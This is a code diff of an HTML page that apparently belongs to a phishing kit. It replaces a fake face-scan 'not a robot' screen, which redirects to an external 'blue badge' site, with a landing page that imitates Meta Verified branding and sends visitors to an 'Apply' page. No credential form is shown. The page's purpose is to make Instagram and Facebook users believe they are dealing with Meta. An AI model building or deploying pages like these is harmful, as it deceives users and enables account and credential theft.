@@ -1,147 +1,115 @@
 
 <!DOCTYPE html>
-
-
-
-
-
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Face Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(to bottom, #f9f9f9, #e6e6e6);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .container-fluid {
+            background: #F5F6F6;
         }
 
-        .container {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        .scanner-ring {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            background: conic-gradient( #4caf50, #2196f3, #ff9800, #f44336, #4caf50);
-            animation: spin 2s linear infinite;
-            margin: 0 auto 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .scanner-core {
-            width: 130px;
-            height: 130px;
-            background: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 54px;
-            color: #28a745;
-        }
-
-        .scanner-complete {
-            animation: none;
-            background: #e8f5e9;
-            border: 3px solid #28a745;
-        }
-
-        .status-message {
-            font-size: 18px;
-            color: #333;
-            margin-bottom: 12px;
-        }
-
-        .verified-message {
-            display: none;
-            font-size: 20px;
-            font-weight: bold;
-            color: #2e7d32;
-            margin-top: 10px;
-        }
-
-        .continue-button {
-            display: none;
-            margin-top: 25px;
-            padding: 12px 28px;
-            background-color: #1976d2;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
+        .btn {
+            background: #0064e0;
             border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.3s ease;
+            border-radius: 100px;
+            padding: 10px 35px;
+            text-decoration: none;
+            color: white;
+            display: inline-block;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
         }
 
-        .continue-button:hover {
-            background-color: #125ea4;
+        .link {
+            font-size: 14px;
+            color: #0064e0;
+            /* Match the button color */
+            text-decoration: underline;
         }
 
-        @keyframes spin {
-            0% {
-                transform: rotate(0);
+        .italic-text {
+            font-size: 14px;
+            /* Adjusted to match text readability */
+            font-style: italic;
+        }
+
+        h1 {
+            font-size: 24px;
+            /* Adjusted for readability */
+            font-weight: bolder;
+            /* Bold for emphasis */
+        }
+
+        p {
+            font-size: 16px;
+            /* Standard text size */
+            line-height: 1.5;
+            /* Improved readability */
+        }
+
+        @media (max-width: 576px) {
+            .mt-5 {
+                margin-left: 20px;
+                margin-top: 30px;
             }
-            100% {
-                transform: rotate(360deg);
-            }
+        }
+
+
+        .footer {
+            font-size: 12px;
+            color: #999;
+            padding: 20px;
+            text-align: center;
+        }
+        .footer a {
+            color: #0064e0;
+            text-decoration: none;
+        }
+
+        .verified {
+            font-size: 60px;
+            color: #3897F0;
         }
     </style>
 </head>
 
 <body>
+    <div class="container-fluid border-0 p-0">
+    </div>
+    <div class="d-flex justify-content-center mt-5">
+        <div class="col-sm-6 mt-5 ms-5">
+            <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/blue.png?alt=media&token=cf6319ac-b711-4365-a78c-cf3a2dec48bd"
+                alt="meta" style="width: 4rem; height: 4rem;" />
 
-    <div class="container">
-        <div class="scanner-ring" id="scannerRing">
-            <div class="scanner-core" id="scannerCore"></div>
+            <h1 class="my-3 fs-1">
+                Become <br /> Meta Verified
+            </h1>
+            <div style="margin-bottom: 30px;"></div>
+            <a href="help.html" class="btn">Apply</a>
+            <p class="mt-4">
+                Enhance your online presence with Meta Verified – a new subscription service designed for creators and businesses on Instagram and Facebook.
+            </p>
+           
+            <p class="mt-4 mb-0">
+                <span class="fw-semibold">Are you representing a business?</span> Find out more about our service for businesses
+            </p>
+            <a href="#" class="link">Meta verified for your businesses</a>
+            <p class="mt-4 mb-0">
+                Availability and features may vary based on location
+            </p>
         </div>
-        <div class="status-message" id="statusText">Scanning your face securely...</div>
-        <div class="verified-message" id="verifiedText">You're not robot, You can continue now</div>
-        <button class="continue-button" id="continueBtn">Continue</button>
+   
     </div>
 
-    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" preload="auto"></audio>
-
-    <script>
-        const redirectURL = "https://get-blue-badge-opportunity-one.vercel.app/"; // Replace this with your target link
-
-        setTimeout(() => {
-            // Play sound
-            document.getElementById("successSound").play();
-
-            // Update ring
-            const ring = document.getElementById("scannerRing");
-            const core = document.getElementById("scannerCore");
-            ring.classList.add("scanner-complete");
-            core.textContent = "✔";
-
-            // Update text and button
-            document.getElementById("statusText").style.display = "none";
-            document.getElementById("verifiedText").style.display = "block";
-            document.getElementById("continueBtn").style.display = "inline-block";
-        }, 3500);
-
-        document.getElementById("continueBtn").addEventListener("click", () => {
-            window.location.href = redirectURL;
-        });
-    </script>
-
+    <div class="footer">
+        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+    </div>
 </body>
 
 </html>
